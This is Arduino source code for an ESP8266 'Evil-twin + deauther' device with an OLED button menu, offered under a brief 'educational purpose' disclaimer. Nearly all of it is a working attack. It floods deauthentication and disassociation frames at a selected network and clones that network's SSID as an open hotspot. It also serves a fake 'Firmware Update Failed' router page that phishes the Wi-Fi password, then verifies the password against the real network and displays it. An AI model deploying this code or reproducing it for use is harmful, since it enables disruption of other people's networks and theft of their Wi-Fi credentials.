/* It is illegal to use Hacking Device in the public
       areas withest taking permission of govt.
         authority. This tutorial is just for 
                educational purpose. */
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <U8g2lib.h>

#define SCREEN_MAIN        0
#define SCREEN_ATTACK      1
#define SCREEN_SELECT      2
#define SCREEN_ABOUT       3
#define SCREEN_SCANNING    4
#define SCREEN_SELECT_MENU 5
#define SCREEN_PASSWORD    6  // New screen state for displaying password

// #define LED_PIN 9           // LED pin definition

extern "C" {
#include "user_interface.h"
}
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

String capturedSSID = "";
String capturedPassword = "";

int currentScreen = SCREEN_MAIN;
bool isManualScanning = false;
int selectMenuIndex = 0;
int ssidListStartIdx = 0;  // For scrolling through SSID list

#define BUTTON_UP   D5
#define BUTTON_DOWN D6
#define BUTTON_OK   D7

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

const char* mainMenuItems[] = { "Scan", "Select", "Attack", "Monitor", "About" };
const int mainMenuCount = 5;
int mainMenuIndex = 0;

#define ATTACK_MENU_COUNT 3
int attackMenuIndex = 0;
bool attackDeauthSelected = false;    // True if "Deauth" is toggled on
bool attackEvilTwinSelected = false;  // True if "Evil-twin" is toggled on

#define VERTICAL_BAR_WIDTH 5
#define VERTICAL_BAR_HEIGHT 10
const unsigned char verticalBar[] = {
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000
};

U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

void setup() {


  
  Serial.begin(115200);
  u8g2.begin();

  
  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x13_tr);
  u8g2.drawStr(33, 13, "EviLTwiN ");
  u8g2.drawStr(56, 37, "by");
  u8g2.drawStr(37, 50, "Ju5t3nc4s3");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(51, 60, "V0.1");
  u8g2.sendBuffer();
  performScan();
  delay(3000);
  u8g2.clearBuffer();

  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_OK, INPUT_PULLUP);

  
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("EviLTwiN", "LivEEviL");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  // pinMode(LED_PIN, OUTPUT);  // Initialize LED pin
  // digitalWrite(LED_PIN, HIGH);
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("wifi?", "esp12345");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    capturedSSID = _selectedNetwork.ssid;
    capturedPassword = _tryPassword;
    // digitalWrite(LED_PIN, LOW);      // Turn on LED
    currentScreen = SCREEN_PASSWORD;  // Switch to password display
    // Turn on LED to indicate password capture
    // digitalWrite(indecator, HIGH);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("EviLTwiN", "LivEEviL");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("EviLTwiN", "LivEEviL");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

int countNetworks() {
  int count = 0;
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    count++;
  }
  return count;
}

void menu() {
 
 

  if (currentScreen == SCREEN_MAIN) {
    if (digitalRead(BUTTON_UP) == LOW) {
      delay(150);
      mainMenuIndex = (mainMenuIndex - 1 + mainMenuCount) % mainMenuCount;
    }
    if (digitalRead(BUTTON_DOWN) == LOW) {
      delay(150);
      mainMenuIndex = (mainMenuIndex + 1) % mainMenuCount;
    }
    if (digitalRead(BUTTON_OK) == LOW) {
      delay(150);
      if (mainMenuIndex == 0) {
        currentScreen = SCREEN_SCANNING;
        isManualScanning = true;
        WiFi.scanDelete();
        WiFi.scanNetworks(true);
      } else if (mainMenuIndex == 1) {
        // New "Select" menu option
        currentScreen = SCREEN_SELECT_MENU;
        selectMenuIndex = 0;
        ssidListStartIdx = 0;
      } else if (mainMenuIndex == 2) {
        currentScreen = SCREEN_ATTACK;
        attackMenuIndex = 0;
      } else if (mainMenuIndex == 4) {
        currentScreen = SCREEN_ABOUT;
      }
    }

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    for (int i = 0; i < mainMenuCount; i++) {
      int y = i * 12 + 10;
      if (i == mainMenuIndex) {
        u8g2.drawXBM(0, y - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT, verticalBar);
      }
      u8g2.drawStr(10, y, mainMenuItems[i]);
    }
    u8g2.sendBuffer();
  }
  else if (currentScreen == SCREEN_SCANNING) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(0, 15, "Scanning...");
    u8g2.drawStr(0, 30, "Loading...");
    u8g2.sendBuffer();

    int n = WiFi.scanComplete();
    if (n >= 0) {
      clearArray();
      for (int i = 0; i < n && i < 16; ++i) {
        _Network network;
        network.ssid = WiFi.SSID(i);
        memcpy(network.bssid, WiFi.BSSID(i), 6);
        network.ch = WiFi.channel(i);
        _networks[i] = network;
      }
      currentScreen = SCREEN_MAIN;
      isManualScanning = false;
    }
  }
  else if (currentScreen == SCREEN_SELECT_MENU) {
    int netCount = countNetworks();
    
    if (netCount == 0) {
      // No networks available
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tf);
      u8g2.drawStr(0, 15, "No networks");
      u8g2.drawStr(0, 30, "Scan first!");
      u8g2.sendBuffer();
      
      if (digitalRead(BUTTON_OK) == LOW) {
        delay(150);
        currentScreen = SCREEN_MAIN;
      }
      return;
    }
    
    if (digitalRead(BUTTON_UP) == LOW) {
      delay(150);
      selectMenuIndex = (selectMenuIndex - 1 + netCount) % netCount;
      // Adjust start index for scrolling
      if (selectMenuIndex < ssidListStartIdx) {
        ssidListStartIdx = selectMenuIndex;
      }
    }
    
    if (digitalRead(BUTTON_DOWN) == LOW) {
      delay(150);
      selectMenuIndex = (selectMenuIndex + 1) % netCount;
      // Adjust start index for scrolling
      if (selectMenuIndex >= ssidListStartIdx + 4) {
        ssidListStartIdx = selectMenuIndex - 3;
      }
    }
    
    if (digitalRead(BUTTON_OK) == LOW) {
      delay(150);
      // Select the network
      _selectedNetwork = _networks[selectMenuIndex];
      currentScreen = SCREEN_MAIN;
    }
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(0, 10, "Select SSID:");
    
    // Display up to 4 SSIDs at a time
    for (int i = 0; i < 4 && i + ssidListStartIdx < netCount; i++) {
      int idx = i + ssidListStartIdx;
      int y = (i + 1) * 12 + 10;
      
      // Truncate SSID if too long
      String displaySSID = _networks[idx].ssid;
      if (displaySSID.length() > 15) {
        displaySSID = displaySSID.substring(0, 13) + "..";
      }
      
      // Add asterisk to selected network
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[idx].bssid, 6)) {
        displaySSID = "*" + displaySSID;
      }
      
      // Show cursor at current selection
      if (idx == selectMenuIndex) {
        u8g2.drawXBM(0, y - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT, verticalBar);
      }
      
      u8g2.drawStr(10, y, displaySSID.c_str());
    }
    
    u8g2.sendBuffer();
  }
    else if (currentScreen == SCREEN_PASSWORD) {
    // digitalWrite(LED_PIN, LOW);  
         u8g2.clearBuffer();
         u8g2.setFontMode(1);
         u8g2.setBitmapMode(1);
         u8g2.setFont(u8g2_font_6x10_tr);
         u8g2.drawStr(28, 11, "Successfully");
         
         u8g2.drawStr(22, 22, " got password");
         
         u8g2.drawStr(4, 34, "for:");
    String displaySSID = capturedSSID.substring(0, 18); // Adjust based on screen width
    u8g2.drawStr(28, 34, displaySSID.c_str());
    
    // Display Password
    u8g2.drawStr(4, 46, "Pass:");
    String displayPass = capturedPassword.substring(0, 18);
    u8g2.drawStr(34, 45, displayPass.c_str());    
    // u8g2.drawStr(0, 60, "Press OK to return");
    u8g2.sendBuffer();

    if (digitalRead(BUTTON_OK) == LOW) {
      delay(150);
      currentScreen = SCREEN_MAIN;
      // digitalWrite(LED_PIN, HIGH); // Turn off LED
    }
  }
  else if (currentScreen == SCREEN_ABOUT) {       
        u8g2.clearBuffer();
        u8g2.setFontMode(1);
        u8g2.setBitmapMode(1);
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(40, 21, "wit oled");
        u8g2.setFont(u8g2_font_6x13_tr);
        u8g2.drawStr(2, 10, "Evil-twin + deauther");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(31, 32, "Version 0.1");
        u8g2.drawStr(1, 44, "code by Penticon");
        u8g2.sendBuffer();
    if (digitalRead(BUTTON_OK) == LOW) {
      delay(150);
      currentScreen = SCREEN_MAIN;
    }
  }
  else if (currentScreen == SCREEN_ATTACK) {
    if (digitalRead(BUTTON_UP) == LOW) {
      delay(150);
      attackMenuIndex = (attackMenuIndex - 1 + ATTACK_MENU_COUNT) % ATTACK_MENU_COUNT;
    }
    if (digitalRead(BUTTON_DOWN) == LOW) {
      delay(150);
      attackMenuIndex = (attackMenuIndex + 1) % ATTACK_MENU_COUNT;
    }
    if (digitalRead(BUTTON_OK) == LOW) {
      delay(150);
      if (attackMenuIndex == 0) {
        currentScreen = SCREEN_MAIN;
      } else if (attackMenuIndex == 1) {
        deauthing_active = !deauthing_active;
      }else if (attackMenuIndex == 2) {
          // Otherwise, toggle the Evil-twin selection with an explicit if/else.
          if (attackEvilTwinSelected == false) {
            attackEvilTwinSelected = true;
            hotspot_active = true;
            dnsServer.stop();
            int n = WiFi.softAPdisconnect(true);
            Serial.println(String(n));
            WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
            WiFi.softAP(_selectedNetwork.ssid.c_str());
            dnsServer.start(53, "*", IPAddress(192,168,4,1));
          } else {
            attackEvilTwinSelected = false;
            hotspot_active = false;
            dnsServer.stop();
            int n = WiFi.softAPdisconnect(true);
            Serial.println(String(n));
            WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
            WiFi.softAP("EviLTwiN", "LivEEviL");
            dnsServer.start(53, "*", IPAddress(192,168,4,1));
          }
          return; // Exit after processing hotspot command.
        }
    }
    
    // ----- Draw the Attack Menu -----
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    int rowHeight = 12;
    
    // Option 0: "Back"
    int y0 = 10;
    if (attackMenuIndex == 0)
      u8g2.drawXBM(0, y0 - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT, verticalBar);
    u8g2.drawStr(10, y0, "Back");
    
    // Option 1: "Deauth" (show "*" if toggled on)
    int y1 = y0 + rowHeight;
    if (attackMenuIndex == 1)
      u8g2.drawXBM(0, y1 - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT, verticalBar);
    if (deauthing_active)
      u8g2.drawStr(10, y1, "*Deauth");
    else
      u8g2.drawStr(10, y1, "Deauth");
    
    // Option 2: "Evil-twin" (show "*" if toggled on)
    int y2 = y1 + rowHeight;
    if (attackMenuIndex == 2)
      u8g2.drawXBM(0, y2 - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT, verticalBar);
    if (hotspot_active)
      u8g2.drawStr(10, y2, "*Evil-twin");
    else
      u8g2.drawStr(10, y2, "Evil-twin");
    
    u8g2.sendBuffer();
    delay(50);
  }

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}




unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  //oled menu 
  menu();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000 && !isManualScanning) {
    performScan();
    now = millis();
  }


  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }

}
